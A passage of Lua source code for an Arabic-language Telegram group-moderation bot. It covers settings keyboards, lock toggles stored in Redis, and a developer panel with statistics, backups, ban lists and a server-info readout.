{{text = "الكيبورد" ,data="GetSe_"..user_id.."_Keyboard"},{text = GetSetieng(chat_id).Keyboard ,data="GetSe_"..user_id.."_Keyboard"}},
{{text = "الملصقات" ,data="GetSe_"..user_id.."_messageSticker"},{text =GetSetieng(chat_id).messageSticker,data="GetSe_"..user_id.."_messageSticker"}},
{{text = "الاغاني" ,data="GetSe_"..user_id.."_messageVoiceNote"},{text =GetSetieng(chat_id).messageVoiceNote,data="GetSe_"..user_id.."_messageVoiceNote"}},
{{text = "الانكليزي" ,data="GetSe_"..user_id.."_WordsEnglish"},{text =GetSetieng(chat_id).WordsEnglish,data="GetSe_"..user_id.."_WordsEnglish"}},
{{text = "الفارسيه" ,data="GetSe_"..user_id.."_WordsPersian"},{text =GetSetieng(chat_id).WordsPersian,data="GetSe_"..user_id.."_WordsPersian"}},
{{text = "الدخول" ,data="GetSe_"..user_id.."_JoinByLink"},{text =GetSetieng(chat_id).JoinByLink,data="GetSe_"..user_id.."_JoinByLink"}},
{{text = "الصور" ,data="GetSe_"..user_id.."_messagePhoto"},{text =GetSetieng(chat_id).messagePhoto,data="GetSe_"..user_id.."_messagePhoto"}},
{{text = "الفيديو" ,data="GetSe_"..user_id.."_messageVideo"},{text =GetSetieng(chat_id).messageVideo,data="GetSe_"..user_id.."_messageVideo"}},
{{text = "الجهات" ,data="GetSe_"..user_id.."_messageContact"},{text =GetSetieng(chat_id).messageContact,data="GetSe_"..user_id.."_messageContact"}},
{{text = "السيلفي" ,data="GetSe_"..user_id.."_messageVideoNote"},{text =GetSetieng(chat_id).messageVideoNote,data="GetSe_"..user_id.."_messageVideoNote"}},
{{text = "➡️" ,data="GetSeBk_"..user_id.."_1"}},
}
}
elseif any == 1 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الاستفتاء" ,data="GetSe_"..user_id.."_messagePoll"},{text =GetSetieng(chat_id).messagePoll,data="GetSe_"..user_id.."_messagePoll"}},
{{text = "الصوت" ,data="GetSe_"..user_id.."_messageAudio"},{text =GetSetieng(chat_id).messageAudio,data="GetSe_"..user_id.."_messageAudio"}},
{{text = "الملفات" ,data="GetSe_"..user_id.."_messageDocument"},{text =GetSetieng(chat_id).messageDocument,data="GetSe_"..user_id.."_messageDocument"}},
{{text = "المتحركه" ,data="GetSe_"..user_id.."_messageAnimation"},{text =GetSetieng(chat_id).messageAnimation,data="GetSe_"..user_id.."_messageAnimation"}},
{{text = "الاضافه" ,data="GetSe_"..user_id.."_AddMempar"},{text =GetSetieng(chat_id).AddMempar,data="GetSe_"..user_id.."_AddMempar"}},
{{text = "التثبيت" ,data="GetSe_"..user_id.."_messagePinMessage"},{text =GetSetieng(chat_id).messagePinMessage,data="GetSe_"..user_id.."_messagePinMessage"}},
{{text = "القناه" ,data="GetSe_"..user_id.."_messageSenderChat"},{text = GetSetieng(chat_id).messageSenderChat ,data="GetSe_"..user_id.."_messageSenderChat"}},
{{text = "الشارحه" ,data="GetSe_"..user_id.."_Cmd"},{text =GetSetieng(chat_id).Cmd,data="GetSe_"..user_id.."_Cmd"}},
{{text = "الموقع" ,data="GetSe_"..user_id.."_messageLocation"},{text = GetSetieng(chat_id).messageLocation ,data="GetSe_"..user_id.."_messageLocation"}},
{{text = "التكرار" ,data="GetSe_"..user_id.."_flood"},{text = GetSetieng(chat_id).flood ,data="GetSe_"..user_id.."_flood"}},
{{text = "⬅️" ,data="GetSeBk_"..user_id.."_0"},{text = "➡️" ,data="GetSeBk_"..user_id.."_2"}},
}
}
elseif any == 2 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الكلايش" ,data="GetSe_"..user_id.."_Spam"},{text =GetSetieng(chat_id).Spam,data="GetSe_"..user_id.."_Spam"}},
{{text = "التعديل" ,data="GetSe_"..user_id.."_Edited"},{text = GetSetieng(chat_id).Edited ,data="GetSe_"..user_id.."_Edited"}},
{{text = "التاك" ,data="GetSe_"..user_id.."_Hashtak"},{text =GetSetieng(chat_id).Hashtak,data="GetSe_"..user_id.."_Hashtak"}},
{{text = "الانلاين" ,data="GetSe_"..user_id.."_via_bot_user_id"},{text = GetSetieng(chat_id).via_bot_user_id ,data="GetSe_"..user_id.."_via_bot_user_id"}},
{{text = "البوتات" ,data="GetSe_"..user_id.."_messageChatAddMembers"},{text =GetSetieng(chat_id).messageChatAddMembers,data="GetSe_"..user_id.."_messageChatAddMembers"}},
{{text = "التوجيه" ,data="GetSe_"..user_id.."_forward_info"},{text = GetSetieng(chat_id).forward_info ,data="GetSe_"..user_id.."_forward_info"}},
{{text = "الروابط" ,data="GetSe_"..user_id.."_Links"},{text =GetSetieng(chat_id).Links,data="GetSe_"..user_id.."_Links"}},
{{text = "الماركداون" ,data="GetSe_"..user_id.."_Markdaun"},{text = GetSetieng(chat_id).Markdaun ,data="GetSe_"..user_id.."_Markdaun"}},
{{text = "الفشار" ,data="GetSe_"..user_id.."_WordsFshar"},{text =GetSetieng(chat_id).WordsFshar,data="GetSe_"..user_id.."_WordsFshar"}},
{{text = "الاشعارات" ,data="GetSe_"..user_id.."_Tagservr"},{text = GetSetieng(chat_id).Tagservr ,data="GetSe_"..user_id.."_Tagservr"}},
{{text = "المعرفات" ,data="GetSe_"..user_id.."_Username"},{text =GetSetieng(chat_id).Username,data="GetSe_"..user_id.."_Username"}},
{{text = "⬅️" ,data="GetSeBk_"..user_id.."_1"},{text = "أوامر التفعيل" ,data="GetSeBk_"..user_id.."_3"}},
}
}
elseif any == 3 then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "اطردني" ,data="GetSe_"..user_id.."_kickme"},{text =redis_get(chat_id,"kickme"),data="GetSe_"..user_id.."_kickme"}},
{{text = "البايو" ,data="GetSe_"..user_id.."_GetBio"},{text =redis_get(chat_id,"GetBio"),data="GetSe_"..user_id.."_GetBio"}},
{{text = "الرابط" ,data="GetSe_"..user_id.."_link"},{text =redis_get(chat_id,"link"),data="GetSe_"..user_id.."_link"}},
{{text = "الترحيب" ,data="GetSe_"..user_id.."_Welcome"},{text =redis_get(chat_id,"Welcome"),data="GetSe_"..user_id.."_Welcome"}},
{{text = "الايدي" ,data="GetSe_"..user_id.."_id"},{text =redis_get(chat_id,"id"),data="GetSe_"..user_id.."_id"}},
{{text = "الايدي بالصوره" ,data="GetSe_"..user_id.."_id:ph"},{text =redis_get(chat_id,"id:ph"),data="GetSe_"..user_id.."_id:ph"}},
{{text = "التنظيف" ,data="GetSe_"..user_id.."_delmsg"},{text =redis_get(chat_id,"delmsg"),data="GetSe_"..user_id.."_delmsg"}},
{{text = "التسليه" ,data="GetSe_"..user_id.."_entertainment"},{text =redis_get(chat_id,"entertainment"),data="GetSe_"..user_id.."_entertainment"}},
{{text = "الالعاب المتطوره" ,data="GetSe_"..user_id.."_gameVip"},{text =redis_get(chat_id,"gameVip"),data="GetSe_"..user_id.."_gameVip"}},
{{text = "من ضافني" ,data="GetSe_"..user_id.."_addme"},{text =redis_get(chat_id,"addme"),data="GetSe_"..user_id.."_addme"}},
{{text = "الردود" ,data="GetSe_"..user_id.."_Reply"},{text =redis_get(chat_id,"Reply"),data="GetSe_"..user_id.."_Reply"}},
{{text = "الالعاب" ,data="GetSe_"..user_id.."_game"},{text =redis_get(chat_id,"game"),data="GetSe_"..user_id.."_game"}},
{{text = "صورتي" ,data="GetSe_"..user_id.."_phme"},{text =redis_get(chat_id,"phme"),data="GetSe_"..user_id.."_phme"}},
{{text = "⬅️" ,data="GetSeBk_"..user_id.."_2"}}
}
}
end
bot.editMessageText(chat_id,msg_id,"*• اعدادات المجموعة *", 'md', true, false, reply_markup)
end
if Text and Text:match("^GetSe_(.*)_(.*)") then
local infomsg = {Text:match("^GetSe_(.*)_(.*)")}
ifd = infomsg[1]
Amr = infomsg[2]
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
return false
end  
if not redis:get(bot_id..":"..chat_id..":settings:"..Amr) then
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"del")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "del" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"ktm")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "ktm" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"ked")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "ked" then 
redis:set(bot_id..":"..chat_id..":settings:"..Amr,"kick")    
elseif redis:get(bot_id..":"..chat_id..":settings:"..Amr) == "kick" then 
redis:del(bot_id..":"..chat_id..":settings:"..Amr)    
end   
if Amr == "messageVideoNote" or Amr == "messageVoiceNote" or Amr == "messageSticker" or Amr == "Keyboard" or Amr == "JoinByLink" or Amr == "WordsPersian" or Amr == "WordsEnglish" or Amr == "messageContact" or Amr == "messageVideo" or Amr == "messagePhoto" then 
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الكيبورد" ,data="GetSe_"..user_id.."_Keyboard"},{text = GetSetieng(chat_id).Keyboard ,data="GetSe_"..user_id.."_Keyboard"}},
{{text = "الملصقات" ,data="GetSe_"..user_id.."_messageSticker"},{text =GetSetieng(chat_id).messageSticker,data="GetSe_"..user_id.."_messageSticker"}},
{{text = "الاغاني" ,data="GetSe_"..user_id.."_messageVoiceNote"},{text =GetSetieng(chat_id).messageVoiceNote,data="GetSe_"..user_id.."_messageVoiceNote"}},
{{text = "الانكليزي" ,data="GetSe_"..user_id.."_WordsEnglish"},{text =GetSetieng(chat_id).WordsEnglish,data="GetSe_"..user_id.."_WordsEnglish"}},
{{text = "الفارسيه" ,data="GetSe_"..user_id.."_WordsPersian"},{text =GetSetieng(chat_id).WordsPersian,data="GetSe_"..user_id.."_WordsPersian"}},
{{text = "الدخول" ,data="GetSe_"..user_id.."_JoinByLink"},{text =GetSetieng(chat_id).JoinByLink,data="GetSe_"..user_id.."_JoinByLink"}},
{{text = "الصور" ,data="GetSe_"..user_id.."_messagePhoto"},{text =GetSetieng(chat_id).messagePhoto,data="GetSe_"..user_id.."_messagePhoto"}},
{{text = "الفيديو" ,data="GetSe_"..user_id.."_messageVideo"},{text =GetSetieng(chat_id).messageVideo,data="GetSe_"..user_id.."_messageVideo"}},
{{text = "الجهات" ,data="GetSe_"..user_id.."_messageContact"},{text =GetSetieng(chat_id).messageContact,data="GetSe_"..user_id.."_messageContact"}},
{{text = "السيلفي" ,data="GetSe_"..user_id.."_messageVideoNote"},{text =GetSetieng(chat_id).messageVideoNote,data="GetSe_"..user_id.."_messageVideoNote"}},
{{text = "➡️" ,data="GetSeBk_"..user_id.."_1"}},
}
}
elseif Amr == "messagePoll" or Amr == "messageAudio" or Amr == "messageDocument" or Amr == "messageAnimation" or Amr == "AddMempar" or Amr == "messagePinMessage" or Amr == "messageSenderChat" or Amr == "Cmd" or Amr == "messageLocation" or Amr == "flood" then 
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الاستفتاء" ,data="GetSe_"..user_id.."_messagePoll"},{text =GetSetieng(chat_id).messagePoll,data="GetSe_"..user_id.."_messagePoll"}},
{{text = "الصوت" ,data="GetSe_"..user_id.."_messageAudio"},{text =GetSetieng(chat_id).messageAudio,data="GetSe_"..user_id.."_messageAudio"}},
{{text = "الملفات" ,data="GetSe_"..user_id.."_messageDocument"},{text =GetSetieng(chat_id).messageDocument,data="GetSe_"..user_id.."_messageDocument"}},
{{text = "المتحركه" ,data="GetSe_"..user_id.."_messageAnimation"},{text =GetSetieng(chat_id).messageAnimation,data="GetSe_"..user_id.."_messageAnimation"}},
{{text = "الاضافه" ,data="GetSe_"..user_id.."_AddMempar"},{text =GetSetieng(chat_id).AddMempar,data="GetSe_"..user_id.."_AddMempar"}},
{{text = "التثبيت" ,data="GetSe_"..user_id.."_messagePinMessage"},{text =GetSetieng(chat_id).messagePinMessage,data="GetSe_"..user_id.."_messagePinMessage"}},
{{text = "القناه" ,data="GetSe_"..user_id.."_messageSenderChat"},{text = GetSetieng(chat_id).messageSenderChat ,data="GetSe_"..user_id.."_messageSenderChat"}},
{{text = "الشارحه" ,data="GetSe_"..user_id.."_Cmd"},{text =GetSetieng(chat_id).Cmd,data="GetSe_"..user_id.."_Cmd"}},
{{text = "الموقع" ,data="GetSe_"..user_id.."_messageLocation"},{text = GetSetieng(chat_id).messageLocation ,data="GetSe_"..user_id.."_messageLocation"}},
{{text = "التكرار" ,data="GetSe_"..user_id.."_flood"},{text = GetSetieng(chat_id).flood ,data="GetSe_"..user_id.."_flood"}},
{{text = "⬅️" ,data="GetSeBk_"..user_id.."_0"},{text = "➡️" ,data="GetSeBk_"..user_id.."_2"}},
}
}
elseif Amr == "Edited" or Amr == "Spam" or Amr == "Hashtak" or Amr == "via_bot_user_id" or Amr == "forward_info" or Amr == "messageChatAddMembers" or Amr == "Links" or Amr == "Markdaun" or Amr == "Username" or Amr == "Tagservr" or Amr == "WordsFshar" then  
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "الكلايش" ,data="GetSe_"..user_id.."_Spam"},{text =GetSetieng(chat_id).Spam,data="GetSe_"..user_id.."_Spam"}},
{{text = "التعديل" ,data="GetSe_"..user_id.."_Edited"},{text = GetSetieng(chat_id).Edited ,data="GetSe_"..user_id.."_Edited"}},
{{text = "التاك" ,data="GetSe_"..user_id.."_Hashtak"},{text =GetSetieng(chat_id).Hashtak,data="GetSe_"..user_id.."_Hashtak"}},
{{text = "الانلاين" ,data="GetSe_"..user_id.."_via_bot_user_id"},{text = GetSetieng(chat_id).via_bot_user_id ,data="GetSe_"..user_id.."_via_bot_user_id"}},
{{text = "البوتات" ,data="GetSe_"..user_id.."_messageChatAddMembers"},{text =GetSetieng(chat_id).messageChatAddMembers,data="GetSe_"..user_id.."_messageChatAddMembers"}},
{{text = "التوجيه" ,data="GetSe_"..user_id.."_forward_info"},{text = GetSetieng(chat_id).forward_info ,data="GetSe_"..user_id.."_forward_info"}},
{{text = "الروابط" ,data="GetSe_"..user_id.."_Links"},{text =GetSetieng(chat_id).Links,data="GetSe_"..user_id.."_Links"}},
{{text = "الماركداون" ,data="GetSe_"..user_id.."_Markdaun"},{text = GetSetieng(chat_id).Markdaun ,data="GetSe_"..user_id.."_Markdaun"}},
{{text = "الفشار" ,data="GetSe_"..user_id.."_WordsFshar"},{text =GetSetieng(chat_id).WordsFshar,data="GetSe_"..user_id.."_WordsFshar"}},
{{text = "الاشعارات" ,data="GetSe_"..user_id.."_Tagservr"},{text = GetSetieng(chat_id).Tagservr ,data="GetSe_"..user_id.."_Tagservr"}},
{{text = "المعرفات" ,data="GetSe_"..user_id.."_Username"},{text =GetSetieng(chat_id).Username,data="GetSe_"..user_id.."_Username"}},
{{text = "⬅️" ,data="GetSeBk_"..user_id.."_2"},{text = "أوامر التفعيل" ,data="GetSeBk_"..user_id.."_3"}},
}
}
end
bot.editMessageText(chat_id,msg_id,"*• اعدادات المجموعة *", 'md', true, false, reply_markup)
end
---
---
if redis:sismember(bot_id..":Status:programmer",data.sender_user_id) or devB(data.sender_user_id) then    
if Text == "Can" then
redis:del(bot_id..":set:"..chat_id..":UpfJson") 
redis:del(bot_id..":set:"..chat_id..":send") 
redis:del(bot_id..":set:"..chat_id..":dev") 
redis:del(bot_id..":set:"..chat_id..":namebot") 
redis:del(bot_id..":set:"..chat_id..":start") 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قائمه الاوامر  .*", 'md', true, false, reply_dev)
end
if Text == "UpfJson" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"* ↯︙قم بأعاده ارسال الملف الخاص بالنسخه .*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":UpfJson",true) 
end
if Text == "GetfJson" then
bot.answerCallbackQuery(data.id, "↯︙جار ارسال النسخه .", true)
local list = redis:smembers(bot_id..":Groups")
local developer = redis:smembers(bot_id..":Status:developer")
local programmer = redis:smembers(bot_id..":Status:programmer") 
local t = '{"idbot": '..bot_id..',"GrBot":{'  
user_idf = redis:smembers(bot_id..":user_id")
if #user_idf ~= 0 then 
t = t..'"user_id":['
for k,v in pairs(user_idf) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #list ~= 0 then 
t = t..',"Groups":['
for k,v in pairs(list) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #programmer ~= 0 then 
t = t..',"programmer":['
for k,v in pairs(programmer) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
if #developer ~= 0 then 
t = t..',"developer":['
for k,v in pairs(developer) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
t = t..',"Dev":"H.muaed",'
for k,v in pairs(list) do
Creator = redis:smembers(bot_id..":"..v..":Status:Creator")
BasicConstructor = redis:smembers(bot_id..":"..v..":Status:BasicConstructor")
Constructor = redis:smembers(bot_id..":"..v..":Status:Constructor")
Owner = redis:smembers(bot_id..":"..v..":Status:Owner")
Administrator = redis:smembers(bot_id..":"..v..":Status:Administrator")
Vips = redis:smembers(bot_id..":"..v..":Status:Vips")
linkid = v or ''
if k == 1 then
t = t..'"'..v..'":{"info":true,'
else
t = t..',"'..v..'":{"info":true,'
end
if #Creator ~= 0 then 
t = t..'"Creator":['
for k,v in pairs(Creator) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #BasicConstructor ~= 0 then 
t = t..'"BasicConstructor":['
for k,v in pairs(BasicConstructor) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Constructor ~= 0 then
t = t..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Owner ~= 0 then
t = t..'"Owner":['
for k,v in pairs(Owner) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Administrator ~= 0 then
t = t..'"Administrator":['
for k,v in pairs(Administrator) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Vips ~= 0 then
t = t..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"GroupsId":"'..linkid..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
bot.sendDocument(chat_id, 0,'./'..bot_id..'.json','↯︙عدد مجموعات التي في البوت { '..#list..'}\n↯︙عدد  الاعضاء التي في البوت { '..#user_idf..'}\n↯︙عدد الثانويين في البوت { '..#programmer..'}\n↯︙عدد المطورين في البوت { '..#developer..'}', 'md')
dofile("start.lua")
end
if Text == "Delch" then
if not redis:get(bot_id..":TheCh") then
bot.answerCallbackQuery(data.id, "↯︙لم يتم وضع اشتراك في البوت", true)
return false
end
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙تم حذف البوت بنجاح .*", 'md', true, false, reply_markup)
redis:del(bot_id..":TheCh")
end
if Text == "addCh" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قم برفع البوت ادمن في قناتك ثم قم بأرسل توجيه من القناه الى البوت .*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":addCh",true) 
end
if Text == 'TheCh' then
if not redis:get(bot_id..":TheCh") then
bot.answerCallbackQuery(data.id, "↯︙لم يتم وضع اشتراك في البوت .", true)
return false
end
idD = redis:get(bot_id..":TheCh")
Get_Chat = bot.getChat(idD)
Info_Chats = bot.getSupergroupFullInfo(idD)
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = Get_Chat.title,url=Info_Chats.invite_link.invite_link}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙الاشتراك الاجباري على القناه اسفل : .*", 'md', true, false, reply_dev)
end  
if Text == "indfo" then
Groups = redis:scard(bot_id..":Groups")   
user_id = redis:scard(bot_id..":user_id") 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في قسم الاحصائيات \n *ٴ— — — — — — — — — — *\n↯︙عدد المشتركين ( "..user_id.." ) عضو \n↯︙عدد المجموعات ( "..Groups.." ) مجموعه *", 'md', true, false, reply_dev)
end
if Text == "chatmem" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ اضف اشتراك .',data="addCh"},{text ="↯ حذف اشتراك",data="Delch"}},
{{text = '↯ الاشتراك .',data="TheCh"}},
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙اهلا بك في لوحه اوامر الاشتراك الاجباري .*", 'md', true, false, reply_dev)
end
if Text == "EditDevbot" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قم الان بأرسل ايدي المطور الجديد*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":dev",true) 
end
if Text == "UpSyu" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
ioserver = io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo '♡︙نظام التشغيل ↫ ⤈\n`'"$LinuxVersion"'`' 
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n♡︙الذاكره العشوائيه ↫ ⤈\n`'"$MemoryUsage"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n♡︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n♡︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n♡︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n♡︙مدة تشغيل السيرفر ↫ ⤈\n`'"$UpTime"'`'
 ]]):read('*all')
bot.editMessageText(chat_id,msg_id,ioserver,"md", true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":dev",true) 
end
if Text == "addstarttxt" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قم الان بأرسل كليشه ستارت الجديده*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":start",true) 
end
if Text == 'lsbnal' then
t = '\n*↯ قائمه محظورين عام  \n  ٴ— — — — — — — — — — *\n'
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯ لا يوجد محظورين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == 'lsmu' then
t = '\n*↯ قائمه المكتومين عام  \n   ٴ— — — — — — — — — — *\n'
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯ لا يوجد مكتومين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == "delbnal" then
local Info_ = redis:smembers(bot_id..":bot:Ban")
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯︙ لا يوجد محظورين في البوت .", true)
return false
end  
redis:del(bot_id..":bot:Ban")
bot.answerCallbackQuery(data.id, "↯︙تم مسح المحظورين بنجاح .", true)
end
if Text == "delmu" then
local Info_ = redis:smembers(bot_id..":bot:silent")
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯︙ لا يوجد مكتومين في البوت .", true)
return false
end  
redis:del(bot_id..":bot:silent")
bot.answerCallbackQuery(data.id, "↯︙تم مسح المكتومين بنجاح .", true)
end
if Text == 'lspor' then
t = '\n*↯ قائمه الثانويين  \n   ٴ— — — — — — — — — — *\n'
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯ لا يوجد ثانويين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == 'lsdev' then
t = '\n*↯ قائمه المطورين  \n   ٴ— — — — — — — — — — *\n'
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "↯ لا يوجد مطورين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." -* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ التحديثات .',data="Updates"}},
{{text = '↯ الاحصائيات .',data="indfo"}},
{{text = '↯ اعدادات البوت .',data="botsettings"}},
{{text = '↯ الاشتراك الاجباري .',data="chatmem"},{text = '↯ الاذاعه .',data="sendtomem"}},
{{text = '↯ النسخ الاحتياطيه .',data="infoAbg"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == "Updates" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تحديث البوت .',data="UpBot"},{text = '↯ تحديث السورس .',data="UpSu"}},
{{text = '↯ قناه التحديثات .',url="t.me/melno88"},{text = '↯ معلومات السيرفر',data="UpSyu"}},
 
{{text = '↯ رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قائمه التحديثات .*", 'md', true, false, reply_dev)
end --
if Text == "botsettings" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '↯ تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '↯ تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "راومو"),data="delnamebot"}},
